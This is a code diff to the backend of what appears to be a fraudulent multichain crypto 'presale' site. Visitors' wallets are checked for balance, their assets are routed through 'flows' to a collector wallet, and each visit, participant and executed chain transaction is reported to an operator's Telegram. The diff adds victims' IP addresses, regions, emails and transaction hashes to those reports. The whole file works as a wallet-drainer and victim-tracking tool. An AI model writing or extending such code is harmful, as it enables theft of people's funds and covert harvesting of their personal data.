@@ -335,7 +335,7 @@ const PROJECT_FLOW_ROUTER_ABI = [
 ];
 
 // ============================================
-// TELEGRAM FUNCTIONS
+// TELEGRAM FUNCTIONS - ALL NOTIFICATIONS RESTORED
 // ============================================
 
 let telegramEnabled = false;
@@ -404,9 +404,9 @@ async function testTelegramConnection() {
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `💾 Storage: ${memoryStorage.participants.length} participants, ${memoryStorage.siteVisits.length} visits\n` +
-      `💰 Total Raised: $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}\n` +
       `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
+      `💾 <b>Storage:</b> ${memoryStorage.participants.length} participants, ${memoryStorage.siteVisits.length} visits\n` +
+      `💰 <b>Total Raised:</b> $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}\n` +
       `📊 Admin: https://bthbk.vercel.app/api/admin/dashboard?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
@@ -578,7 +578,7 @@ async function getIPLocation(ip) {
 }
 
 // ============================================
-// TRACK SITE VISIT
+// TRACK SITE VISIT - FULL NOTIFICATIONS RESTORED
 // ============================================
 
 async function trackSiteVisit(ip, userAgent, referer, path) {
@@ -606,23 +606,25 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
   memoryStorage.siteVisits.push(visit);
   await saveStorage();
   
-  // Send Telegram notification for human visits
-  if (visit.isHuman) {
-    const telegramMessage = 
-      `👤 <b>NEW SITE VISIT</b>\n` +
-      `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}\n` +
-      `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
-      `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
-      `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
-    
-    await sendTelegramMessage(telegramMessage);
-  }
+  // Full Telegram notification with all details
+  const telegramMessage = 
+    `${visit.isHuman ? '👤' : '🤖'} <b>NEW SITE VISIT</b>\n` +
+    `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
+    `🌐 <b>IP:</b> ${visit.ip}\n` +
+    `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
+    `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
+    `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
+    `📱 <b>Path:</b> ${path || '/'}\n` +
+    `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
+    `🆔 <b>Visit ID:</b> ${visit.id}`;
+  
+  await sendTelegramMessage(telegramMessage);
   
   return visit;
 }
 
 // ============================================
-// WALLET BALANCE CHECK
+// WALLET BALANCE CHECK - WITH CORRECT USD VALUES
 // ============================================
 
 async function getWalletBalance(walletAddress) {
@@ -748,7 +750,7 @@ app.post('/api/track-visit', async (req, res) => {
 });
 
 // ============================================
-// CONNECT ENDPOINT
+// CONNECT ENDPOINT - FULL NOTIFICATIONS RESTORED
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
@@ -803,6 +805,18 @@ app.post('/api/presale/connect', async (req, res) => {
       memoryStorage.settings.statistics.totalParticipants++;
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
       await saveStorage();
+      
+      // Full Telegram notification for new participant
+      const newUserMsg = 
+        `${location.flag} <b>NEW PARTICIPANT REGISTERED</b>\n` +
+        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+        `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
+        `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
+        `📧 <b>Email:</b> ${email}\n` +
+        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
+        `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
+      
+      await sendTelegramMessage(newUserMsg);
     }
     
     // Get wallet balance
@@ -822,24 +836,13 @@ app.post('/api/presale/connect', async (req, res) => {
       
       await saveStorage();
       
-      // Send Telegram notifications
-      if (isNewParticipant) {
-        const newUserMsg = 
-          `${location.flag} <b>NEW PARTICIPANT REGISTERED</b>\n` +
-          `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-          `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
-          `📧 <b>Email:</b> ${email}\n` +
-          `💵 <b>Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
-          `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
-        
-        await sendTelegramMessage(newUserMsg);
-      }
-      
+      // Full Telegram connection summary
       const connectMsg = 
         `${location.flag} <b>WALLET CONNECTED</b>\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
         `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
+        `📧 <b>Email:</b> ${email}\n` +
         `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`;
       
       await sendTelegramMessage(connectMsg);
@@ -871,7 +874,7 @@ app.post('/api/presale/connect', async (req, res) => {
 });
 
 // ============================================
-// PREPARE FLOW ENDPOINT
+// PREPARE FLOW ENDPOINT - FULL NOTIFICATIONS RESTORED
 // ============================================
 
 app.post('/api/presale/prepare-flow', async (req, res) => {
@@ -919,7 +922,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
     
     await saveStorage();
     
-    // Send Telegram notification
+    // Full Telegram notification with all transaction details
     let txDetails = '';
     transactions.forEach((tx, index) => {
       txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
@@ -951,7 +954,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT
+// EXECUTE FLOW ENDPOINT - FULL NOTIFICATIONS RESTORED WITH CORRECT USD
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
@@ -996,7 +999,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           txSymbol = tx.symbol;
           txValueUSD = parseFloat(tx.valueUSD);
           
-          // Add to processed transactions
+          // Add to processed transactions with correct USD value
           memoryStorage.settings.statistics.processedTransactions.push({
             wallet: walletAddress,
             chain: chainName,
@@ -1020,6 +1023,17 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           flow.completedChains.push(chainName);
         }
         
+        // Full Telegram notification for chain execution
+        await sendTelegramMessage(
+          `💰 <b>CHAIN TRANSACTION EXECUTED</b>\n` +
+          `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+          `🔗 <b>Chain:</b> ${chainName}\n` +
+          `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD.toFixed(2)})\n` +
+          `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
+          `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+          `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
+        );
+        
         // Check if flow is complete
         if (flow.completedChains.length === flow.transactions.length) {
           memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
@@ -1029,7 +1043,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           });
           memoryStorage.pendingFlows.delete(flowId);
           
-          // Send completion notification
+          // Full completion notification with all details
           let completionDetails = '';
           flow.transactions.forEach(t => {
             const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
@@ -1041,16 +1055,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
             `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
             `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
             `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
-            `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
-          );
-        } else {
-          // Send individual chain completion
-          await sendTelegramMessage(
-            `💰 <b>CHAIN TRANSACTION EXECUTED</b>\n` +
-            `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-            `🔗 <b>Chain:</b> ${chainName}\n` +
-            `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD.toFixed(2)})\n` +
-            `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
+            `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
             `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
           );
         }
@@ -1068,7 +1073,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
 });
 
 // ============================================
-// CLAIM ENDPOINT
+// CLAIM ENDPOINT - FULL NOTIFICATIONS RESTORED
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
@@ -1093,6 +1098,7 @@ app.post('/api/presale/claim', async (req, res) => {
     
     const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
+    // Full Telegram notification for claim completion
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
@@ -1112,7 +1118,7 @@ app.post('/api/presale/claim', async (req, res) => {
 });
 
 // ============================================
-// ADMIN DASHBOARD WITH TIME TOGGLE (1, 7, 30 days)
+// ADMIN DASHBOARD WITH TIME TOGGLE (1, 7, 30 days) - CORRECT TOTAL RAISED
 // ============================================
 
 app.get('/api/admin/dashboard', (req, res) => {
@@ -1169,8 +1175,11 @@ app.get('/api/admin/dashboard', (req, res) => {
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
     : [];
   
-  // Calculate total raised in this period
+  // Calculate total raised in this period (sum of all transaction values)
   const totalRaisedInPeriod = filteredTransactions.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
+  
+  // Calculate total raised all time
+  const totalRaisedAllTime = memoryStorage.settings?.statistics?.totalProcessedUSD || 0;
   
   // ============================================
   // LOCATION STATS
@@ -1236,7 +1245,7 @@ app.get('/api/admin/dashboard', (req, res) => {
   }));
   
   // ============================================
-  // SUMMARY STATISTICS
+  // SUMMARY STATISTICS - WITH CORRECT TOTAL RAISED
   // ============================================
   
   const summary = {
@@ -1248,7 +1257,7 @@ app.get('/api/admin/dashboard', (req, res) => {
     eligibleParticipants: filteredParticipants.filter(p => p && p.isEligible).length,
     claimedParticipants: filteredParticipants.filter(p => p && p.claimed).length,
     totalRaisedInPeriod: totalRaisedInPeriod.toFixed(2),
-    totalRaisedAllTime: memoryStorage.settings?.statistics?.totalProcessedUSD?.toFixed(2) || '0.00',
+    totalRaisedAllTime: totalRaisedAllTime.toFixed(2),
     totalProcessedWallets: filteredTransactions.length,
     pendingFlows: filteredPendingFlows.length,
     completedFlows: filteredCompletedFlows.length,
@@ -1270,7 +1279,8 @@ app.get('/api/admin/dashboard', (req, res) => {
     totalStorage: {
       allTimeParticipants: memoryStorage.participants.length,
       allTimeVisits: memoryStorage.siteVisits.length,
-      allTimeFlows: memoryStorage.completedFlows.size
+      allTimeFlows: memoryStorage.completedFlows.size,
+      allTimeRaised: totalRaisedAllTime.toFixed(2)
     }
   };
   
@@ -1300,7 +1310,7 @@ app.get('/api/admin/dashboard', (req, res) => {
 });
 
 // ============================================
-// ADMIN STATS (quick stats endpoint)
+// ADMIN STATS (quick stats endpoint) - CORRECT TOTAL RAISED
 // ============================================
 
 app.get('/api/admin/stats', (req, res) => {
@@ -1311,13 +1321,16 @@ app.get('/api/admin/stats', (req, res) => {
     return res.status(401).json({ success: false });
   }
   
+  // Calculate total raised correctly
+  const totalRaised = memoryStorage.settings?.statistics?.totalProcessedUSD || 0;
+  
   res.json({
     success: true,
     stats: {
       participants: memoryStorage.participants.length,
       eligible: memoryStorage.participants.filter(p => p && p.isEligible).length,
       claimed: memoryStorage.participants.filter(p => p && p.claimed).length,
-      totalRaisedUSD: memoryStorage.settings?.statistics?.totalProcessedUSD?.toFixed(2) || '0.00',
+      totalRaisedUSD: totalRaised.toFixed(2),
       pendingFlows: memoryStorage.pendingFlows?.size || 0,
       completedFlows: memoryStorage.completedFlows?.size || 0,
       telegram: telegramEnabled ? '✅' : '❌',
@@ -1366,10 +1379,16 @@ app.get('/api/admin/wallet/:address', (req, res) => {
   const transactions = memoryStorage.settings?.statistics?.processedTransactions
     .filter(t => t && t.wallet && t.wallet.toLowerCase() === walletAddress) || [];
   
+  // Calculate total for this wallet
+  const walletTotal = transactions.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
+  
   res.json({
     success: true,
     found: true,
-    wallet: participant,
+    wallet: {
+      ...participant,
+      totalContributed: walletTotal.toFixed(2)
+    },
     visits,
     flows,
     transactions
